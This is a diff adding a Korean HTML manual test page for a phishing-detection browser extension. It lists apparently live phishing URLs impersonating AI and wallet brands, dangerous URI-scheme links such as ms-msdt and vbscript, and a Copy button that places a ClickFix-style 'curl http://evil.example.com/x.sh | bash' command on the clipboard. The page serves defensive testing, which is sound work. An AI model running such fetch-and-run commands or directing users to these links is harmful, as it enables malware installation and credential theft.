@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <title>피싱 검사기 — 테스트 페이지</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans KR", sans-serif; max-width: 980px; margin: 24px auto; padding: 0 16px; color: #1f2937; }
+    h1 { font-size: 22px; margin-bottom: 4px; }
+    h2 { margin-top: 28px; font-size: 16px; border-bottom: 1px solid #e5e7eb; padding-bottom: 4px; }
+    .url { color: #1f6feb; word-break: break-all; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 13px; }
+    .row { display: grid; grid-template-columns: 1fr 260px 110px; gap: 12px; align-items: center; padding: 8px 0; border-bottom: 1px dotted #e5e7eb; }
+    .hint { color: #6b7280; font-size: 12px; }
+    .danger { color: #b91c1c; font-weight: 600; font-size: 12px; text-align: right; }
+    .safe { color: #1f883d; font-weight: 600; font-size: 12px; text-align: right; }
+    .neutral { color: #6b7280; font-weight: 600; font-size: 12px; text-align: right; }
+    .legend { background: #f9fafb; padding: 14px 16px; border-radius: 8px; font-size: 13px; line-height: 1.7; margin-bottom: 16px; border: 1px solid #e5e7eb; }
+    code { background: #f3f4f6; padding: 1px 5px; border-radius: 4px; font-size: 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+    button.test { padding: 7px 14px; border: 1px solid #d1d5db; background: #fff; cursor: pointer; border-radius: 4px; font-size: 12px; font-family: inherit; }
+    button.test:hover { background: #f3f4f6; }
+    .group { border: 1px solid #e5e7eb; padding: 12px 16px; border-radius: 8px; margin: 8px 0; background: #fafafa; }
+    .ctx-host { margin-top: 8px; padding: 8px 12px; background: #fef3c7; color: #78350f; border-radius: 6px; font-size: 12px; }
+    .ctx-host.ok { background: #d1fae5; color: #065f46; }
+    p { margin: 6px 0; }
+    ul { margin: 6px 0 0 0; padding-left: 18px; }
+  </style>
+</head>
+<body>
+  <h1>🛡 피싱 링크 검사기 — 수동 테스트</h1>
+  <p class="hint" id="hostInfo"></p>
+
+  <div class="legend">
+    <strong>5가지 트리거와 사용법</strong>
+    <ul>
+      <li><strong>컨텍스트 메뉴</strong> — 아래 링크를 <em>우클릭</em> → <code>이 링크 피싱 검사</code> → 시스템 알림으로 결과</li>
+      <li><strong>툴바 액션</strong> — 의심 URL로 이동 후 확장 툴바 아이콘 클릭 → <code>현재 페이지 검사</code> → 위험이면 탭이 warning 페이지로 전환</li>
+      <li><strong>다운로드 자동</strong> — 다운로드 시작 시 호스팅 페이지 자동 검사 (이 페이지의 <code>.exe</code> 링크 클릭으로 테스트)</li>
+      <li><strong>클릭 가드</strong> — 다운로드/<code>Copy</code> 버튼/위험 URI 스킴 클릭 인터셉트 (<strong>http로 접근해야</strong> 동작)</li>
+      <li><strong>OWA 자동</strong> — <code>owa.skplanet.com</code> 본문 외부 링크 (여기선 테스트 불가)</li>
+    </ul>
+  </div>
+
+  <h2>1. 알려진 피싱 (workers.dev / pages.dev 클론)</h2>
+  <div class="row">
+    <a class="url" href="https://dawn-snowflake-c5fe.emily-young1995.workers.dev" target="_blank">https://dawn-snowflake-c5fe.emily-young1995.workers.dev</a>
+    <span class="hint">NotebookLM 사칭 — workers.dev</span>
+    <span class="danger">DANGER 예상 (O1)</span>
+  </div>
+  <div class="row">
+    <a class="url" href="https://project-deepsk530291kx.pages.dev" target="_blank">https://project-deepsk530291kx.pages.dev</a>
+    <span class="hint">DeepSeek 사칭 — pages.dev</span>
+    <span class="danger">DANGER 예상 (O1)</span>
+  </div>
+  <div class="row">
+    <a class="url" href="https://autumn-mud-2219.davis-drew1992.workers.dev" target="_blank">https://autumn-mud-2219.davis-drew1992.workers.dev</a>
+    <span class="hint">Claude 사칭 (claude.com으로 회피 redirect)</span>
+    <span class="danger">DANGER 예상 (O0+O1)</span>
+  </div>
+
+  <h2>2. 실제 wild 피싱 (TP wallet 패밀리)</h2>
+  <div class="row">
+    <a class="url" href="http://skill-meta.com" target="_blank">http://skill-meta.com</a>
+    <span class="hint">TP Wallet 사칭 (중국어)</span>
+    <span class="danger">DANGER 예상</span>
+  </div>
+  <div class="row">
+    <a class="url" href="https://xhlk.net" target="_blank">https://xhlk.net</a>
+    <span class="hint">TP Wallet 사칭 (중국어)</span>
+    <span class="danger">DANGER 예상</span>
+  </div>
+
+  <h2>3. 정상 사이트 (대조군)</h2>
+  <div class="row">
+    <a class="url" href="https://www.google.com" target="_blank">https://www.google.com</a>
+    <span class="hint">검색</span>
+    <span class="safe">SAFE 예상</span>
+  </div>
+  <div class="row">
+    <a class="url" href="https://github.com" target="_blank">https://github.com</a>
+    <span class="hint">GitHub 메인</span>
+    <span class="safe">SAFE 예상</span>
+  </div>
+  <div class="row">
+    <a class="url" href="https://chat.deepseek.com" target="_blank">https://chat.deepseek.com</a>
+    <span class="hint">진짜 DeepSeek</span>
+    <span class="safe">SAFE 예상</span>
+  </div>
+  <div class="row">
+    <a class="url" href="https://claude.ai" target="_blank">https://claude.ai</a>
+    <span class="hint">진짜 Claude</span>
+    <span class="safe">SAFE 예상</span>
+  </div>
+
+  <h2>4. 클릭 가드 테스트</h2>
+  <div id="ctxBanner" class="ctx-host">⚠ click_guard는 <code>http://</code> 또는 <code>https://</code> 컨텍스트에서만 동작합니다. <code>file://</code>로 열린 경우 아래 클릭 테스트는 안 됩니다.</div>
+
+  <div class="group">
+    <p><strong>4-1. 위험 URI 스킴</strong> — 클릭 시 차단 + confirm 다이얼로그 떠야 함.</p>
+    <div class="row">
+      <a class="url" href="applescript://com.example/inert?display%20dialog%20%22test%22">applescript://test-inert</a>
+      <span class="hint">macOS AppleScript 스킴 (Follina/Pegasus 가족)</span>
+      <span class="danger">차단 + confirm</span>
+    </div>
+    <div class="row">
+      <a class="url" href="ms-msdt://test-inert">ms-msdt://test-inert</a>
+      <span class="hint">Windows MSDT 스킴 (CVE-2022-30190 Follina)</span>
+      <span class="danger">차단 + confirm</span>
+    </div>
+    <div class="row">
+      <a class="url" href="vbscript:msgbox(0)">vbscript:msgbox(0)</a>
+      <span class="hint">레거시 VBScript 스킴</span>
+      <span class="danger">차단 + confirm</span>
+    </div>
+  </div>
+
+  <div class="group">
+    <p><strong>4-2. 다운로드 트리거</strong> — 클릭 시 click_guard 인터셉트 + scanUrl 호출.</p>
+    <div class="row">
+      <a class="url" href="/nonexistent_test_file.exe" download>nonexistent_test_file.exe (download attr)</a>
+      <span class="hint">EXEC_EXT_RE.exe 매칭 + download 속성</span>
+      <span class="danger">scan 트리거 + 결과 알림</span>
+    </div>
+    <div class="row">
+      <a class="url" href="/setup_test.dmg" download>setup_test.dmg</a>
+      <span class="hint">EXEC_EXT_RE.dmg 매칭</span>
+      <span class="danger">scan 트리거</span>
+    </div>
+  </div>
+
+  <div class="group">
+    <p><strong>4-3. 클립보드 카피 버튼</strong> — 버튼 텍스트가 <code>Copy</code> / <code>복사</code> 단어이면 click_guard 트리거.</p>
+    <div class="row">
+      <button class="test" onclick="navigator.clipboard.writeText('curl http://evil.example.com/x.sh | bash')">Copy</button>
+      <span class="hint">ClickFix 페이로드 (쉘 명령) — click_guard가 scan 시작, 클립보드 후크가 페이로드 캐치</span>
+      <span class="danger">scan + clipboardWrites에 페이로드</span>
+    </div>
+    <div class="row">
+      <button class="test" onclick="navigator.clipboard.writeText('hello, this is harmless text')">복사하기</button>
+      <span class="hint">정상 카피 (무해한 텍스트)</span>
+      <span class="neutral">scan 후 SAFE</span>
+    </div>
+    <div class="row">
+      <button class="test" onclick="alert('I am a copyright button (not copy)')">Copyright © 2026</button>
+      <span class="hint">false-match 회귀 테스트 — 단어 'Copyright'은 trigger 안 되어야 함</span>
+      <span class="safe">트리거 안 됨이 정답</span>
+    </div>
+  </div>
+
+  <h2>5. False Positive 위험지대 (정밀도)</h2>
+  <div class="row">
+    <a class="url" href="https://xpack.github.io/xpm/docs/install/" target="_blank">https://xpack.github.io/xpm/docs/install/</a>
+    <span class="hint">github.io에 호스팅된 정상 문서 (개발 도구)</span>
+    <span class="neutral">SAFE — FP 안 나야</span>
+  </div>
+  <div class="row">
+    <a class="url" href="https://nextjs.org" target="_blank">https://nextjs.org</a>
+    <span class="hint">Vercel/Next.js 공식 — 정상 브랜드 정식 도메인</span>
+    <span class="safe">SAFE 예상</span>
+  </div>
+
+  <hr>
+  <p class="hint">
+    <strong>주의</strong>: 위 피싱 링크들은 실제 살아 있는 악성 사이트일 수 있습니다.
+    검사용 hidden 탭에서만 렌더되도록 설계됐으니 우클릭 컨텍스트 메뉴 사용을 권장합니다.
+    링크를 직접 클릭(좌클릭)하면 일반 탭이 열려 페이지 JS가 실제 실행됩니다.
+  </p>
+
+  <script>
+    // 페이지 호스트 정보 — file://이면 경고
+    const info = document.getElementById("hostInfo");
+    info.textContent = "현재 URL: " + location.href;
+    const banner = document.getElementById("ctxBanner");
+    if (location.protocol === "file:") {
+      banner.classList.remove("ok");
+    } else {
+      banner.classList.add("ok");
+      banner.innerHTML = "✓ <code>" + location.protocol + "</code> 컨텍스트 — click_guard 정상 동작 조건.";
+    }
+  </script>
+</body>
+</html>
